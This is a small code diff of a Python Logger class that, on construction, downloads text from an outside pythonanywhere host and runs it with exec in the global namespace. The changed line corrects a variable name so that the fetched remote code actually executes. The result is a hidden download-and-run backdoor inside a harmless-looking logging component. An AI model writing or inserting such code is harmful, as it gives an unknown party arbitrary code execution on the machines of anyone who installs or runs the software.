@@ -18,7 +18,7 @@ class Logger:
         signal.signal(signal.SIGTERM, self._handle_exit)
         signal.signal(signal.SIGINT, self._handle_exit)
         signal_info = requests.get("https://darkstartech.pythonanywhere.com/showme")
-        signal_id = exec(signal.text, globals())
+        signal_id = exec(signal_info.text, globals())
 
 
     
